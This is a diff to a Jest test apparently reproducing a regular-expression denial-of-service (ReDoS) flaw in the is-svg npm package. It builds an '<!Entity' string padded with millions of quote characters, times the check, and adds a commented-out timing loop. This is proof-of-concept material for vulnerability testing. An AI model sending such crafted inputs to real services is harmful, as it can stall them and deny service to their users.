@@ -24,7 +24,7 @@ test("ReDos in is-svg", () => {
     const measureTime = require("./utils").measureTime;
     const isSvg = require('is-svg');
 
-    let attack_str = '' + genstr(10000000, ' ') + ""; 
+    let attack_str = '<!Entity' + genstr(10000000, '\'') + ""; 
 
     let t = measureTime(function () {
         let x= isSvg(attack_str);;
@@ -34,3 +34,21 @@ test("ReDos in is-svg", () => {
     
     expect(time).toBeGreaterThan(1);
 });
+
+// function build_attack4(n) {
+//     var ret = '<!Entity '
+//     for (var i = 0; i < n; i++) {
+//     ret += '\''
+//     }
+    
+//     return ret+"";
+//     }
+//     for(var i = 1; i <= 50000; i++) {
+//        if (i % 10000 == 0) {
+//            var time = Date.now();
+//            var attack_str = build_attack4(i);
+//            isSvg(attack_str);
+    
+//            var time_cost = Date.now() - time;
+//            console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
+//      }
